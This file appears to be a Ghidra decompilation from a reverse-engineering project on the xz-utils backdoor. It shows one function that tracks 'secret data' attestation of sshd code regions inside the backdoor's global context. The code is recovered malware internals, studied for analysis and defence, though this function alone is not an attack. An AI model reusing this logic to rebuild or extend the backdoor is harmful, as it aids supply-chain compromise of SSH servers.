// /home/kali/xzre-ghidra/xzregh/10AAC0_secret_data_append_singleton.c
// Function: secret_data_append_singleton @ 0x10AAC0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall secret_data_append_singleton(u8 * call_site, u8 * code, secret_data_shift_cursor_t shift_cursor, uint shift_count, uint operation_index)


/*
 * AutoDoc: Guarantees each attestation slot runs at most once. It uses the per-operation byte array inside global_ctx->shift_operations to
 * guard entry, resolves the function boundaries with find_function relative to the recorded sshd code limits, invokes
 * secret_data_append_from_code (starting after the call site if present), and increments global_ctx->num_shifted_bits by
 * shift_count on success.
 */

#include "xzre_types.h"

BOOL secret_data_append_singleton
               (u8 *call_site,u8 *code,secret_data_shift_cursor_t shift_cursor,uint shift_count,
               uint operation_index)

{
  long ctx_addr;
  BOOL success;
  void *func_start;
  
  ctx_addr = global_ctx;
  func_start = (void *)0x0;
  if ((global_ctx == 0) || (*(char *)(global_ctx + 0x141 + (ulong)operation_index) != '\0')) {
LAB_0010ab60:
    success = TRUE;
  }
  else {
    *(undefined1 *)(global_ctx + 0x141 + (ulong)operation_index) = 1;
    success = find_function(code,&func_start,(void **)0x0,*(u8 **)(ctx_addr + 0x80),
                          *(u8 **)(ctx_addr + 0x88),FIND_NOP);
    if (success != FALSE) {
      success = secret_data_append_from_code
                        (func_start,*(void **)(global_ctx + 0x88),shift_cursor,shift_count,
                         (uint)(call_site == (u8 *)0x0));
      if (success != FALSE) {
        *(int *)(global_ctx + 0x160) = *(int *)(global_ctx + 0x160) + shift_count;
        goto LAB_0010ab60;
      }
    }
    success = FALSE;
  }
  return success;
}

